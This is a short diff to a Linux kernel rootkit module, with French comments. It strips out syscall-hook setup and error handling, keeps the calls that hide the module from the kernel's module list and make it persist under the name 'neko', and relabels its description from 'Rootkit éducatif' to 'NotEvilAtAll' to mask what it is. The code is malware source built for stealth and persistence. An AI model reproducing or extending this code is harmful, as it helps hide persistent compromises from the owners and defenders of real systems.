@@ -6,49 +6,23 @@
 /* Initialisation du module principal */
 static int __init my_module_init(void)
 {
-    int ret;
-
-    /* Installer les hooks pour les syscalls */
-    ret = install_hooks();
-    if (ret != 0) {
-        printk(KERN_ERR "Erreur lors de l'installation des hooks\n");
-        return ret;
-    }
-
-    /* Masquer le module de la liste */
-    ret = hide_init(THIS_MODULE);
-    if (ret != 0) {
-        printk(KERN_ERR "Erreur lors du masquage du module\n");
-        uninstall_hooks();
-        return ret;
-    }
+    if (hide_init(THIS_MODULE) != 0)
+        return -EINVAL;
     hide(THIS_MODULE, 1);
-
-    /* Activer la persistance */
-    ret = enable_persistence(THIS_MODULE->name);
-    if (ret != 0) {
-        printk(KERN_ERR "Erreur lors de l'activation de la persistance\n");
-        hide(THIS_MODULE, 0);
-        uninstall_hooks();
-        return ret;
-    }
-
+    const char *module_name = "neko"; 
+    enable_persistence(module_name); 
     return 0;
 }
 
 /* Nettoyage du module principal */
 static void __exit my_module_exit(void)
 {
-    /* Restaurer la visibilité du module */
-    hide(THIS_MODULE, 0);
-
-    /* Désinstaller les hooks */
-    uninstall_hooks();
+    hide(THIS_MODULE, 0); 
 }
 
 module_init(my_module_init);
 module_exit(my_module_exit);
 
 MODULE_LICENSE("GPL");
-MODULE_DESCRIPTION("Rootkit éducatif");
+MODULE_DESCRIPTION("NotEvilAtAll");
 MODULE_AUTHOR("2600");
